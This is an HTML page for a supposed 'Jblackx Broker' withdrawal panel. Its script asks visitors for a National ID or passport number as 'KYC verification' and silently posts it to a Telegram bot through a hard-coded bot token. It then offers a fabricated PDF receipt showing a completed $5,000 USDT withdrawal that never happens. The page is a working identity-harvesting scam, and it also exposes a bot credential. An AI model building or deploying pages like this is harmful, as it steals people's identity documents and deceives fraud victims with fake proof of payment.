<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Withdraw - Jblackx Broker</title>
  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css"/>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
  <style>
    body {
      background-color: #0b0c10;
      color: #c5c6c7;
      padding: 30px;
      font-family: 'Segoe UI', sans-serif;
    }
    .btn-primary, .btn-success {
      border-radius: 12px;
    }
    #kycModal .modal-content {
      background: #1f2833;
      color: #fff;
    }
  </style>
</head>
<body>

  <div class="container text-center">
    <h2 class="mb-4">üîê Withdrawal Panel</h2>

    <button class="btn btn-primary" onclick="showKYC()">Proceed with Withdrawal</button>
    
    <div id="receiptArea" class="mt-4" style="display:none;">
      <button class="btn btn-success" onclick="downloadReceipt()">üìÑ Download Receipt (PDF)</button>
    </div>
  </div>

  <!-- KYC Modal -->
  <div class="modal fade" id="kycModal" tabindex="-1" role="dialog" aria-labelledby="kycModalLabel" aria-hidden="true">
    <div class="modal-dialog modal-dialog-centered">
      <div class="modal-content p-4">
        <h5 class="modal-title" id="kycModalLabel">üîé KYC Verification Required</h5>
        <p>Please complete KYC verification to proceed with withdrawal.</p>
        <input type="text" id="kycInput" class="form-control mb-3" placeholder="Enter National ID or Passport No."/>
        <button class="btn btn-success btn-block" onclick="completeKYC()">Verify and Withdraw</button>
      </div>
    </div>
  </div>

  <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.2/dist/js/bootstrap.bundle.min.js"></script>

  <script>
    function showKYC() {
      $('#kycModal').modal('show');
    }

    function completeKYC() {
      const kyc = document.getElementById('kycInput').value.trim();
      if (!kyc) {
        alert("Enter a valid KYC ID to proceed.");
        return;
      }
      $('#kycModal').modal('hide');
      sendToTelegram(kyc);
      document.getElementById('receiptArea').style.display = 'block';
    }

    function sendToTelegram(kycID) {
      const txID = "BNX-" + Math.random().toString(36).substring(2, 10).toUpperCase();
      const payload = {
        chat_id: "@Officialwoongna",
        text: `üí∏ *New Withdrawal Request*\n\nüë§ User: @Officialwoongna\nüÜî KYC: ${kycID}\nüí∞ Amount: $5,000 USDT\nüîÅ TXID: ${txID}\n‚úÖ Status: Completed\nüìÖ ${new Date().toLocaleString()}`,
        parse_mode: "Markdown"
      };

      fetch(`https://api.telegram.org/bot8313979154:AAFQ9nl0yINqmAp3dgpOrSwrNAeP9YN1k3g/sendMessage`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(payload)
      });
    }

    function downloadReceipt() {
      const { jsPDF } = window.jspdf;
      const doc = new jsPDF();
      const txID = "BNX-" + Math.random().toString(36).substring(2, 10).toUpperCase();

      doc.setFontSize(18);
      doc.text("Jblackx Broker - Withdrawal Receipt", 20, 20);
      doc.setFontSize(12);
      doc.text(`Transaction ID: ${txID}`, 20, 40);
      doc.text(`Date: ${new Date().toLocaleString()}`, 20, 50);
      doc.text(`User: @Officialwoongna`, 20, 60);
      doc.text(`Amount: $5,000 USDT`, 20, 70);
      doc.text(`Status: Completed`, 20, 80);

      doc.save("withdrawal_receipt.pdf");
    }
  </script>

</body>
</html>
